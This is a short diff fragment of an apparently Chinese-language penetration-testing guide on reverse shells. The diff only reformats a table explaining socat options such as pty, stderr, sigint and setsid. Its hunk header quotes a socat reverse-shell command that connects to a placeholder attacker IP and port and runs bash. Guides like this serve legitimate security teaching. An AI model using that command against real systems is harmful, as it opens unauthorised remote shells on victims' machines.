@@ -106,17 +106,11 @@ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid
 參數解析：
 
 | 參數 | 功能描述 |
-
-| :--- | :--- |
-
+| --- | --- |
 | pty | 在目標機分配一個偽終端 (pseudoterminal)，穩定化核心步驟。 |
-
 | stderr | 確保錯誤訊息能正常顯示在 Shell 中。 |
-
 | sigint | 轉發 Ctrl + C 到子進程（可終止 Shell 內的程式而非 Shell 本身）。 |
-
 | setsid | 在新會話中建立進程。 |
-
 | sane | 終端狀態「正常化」，協助穩定。 |
 
 ---
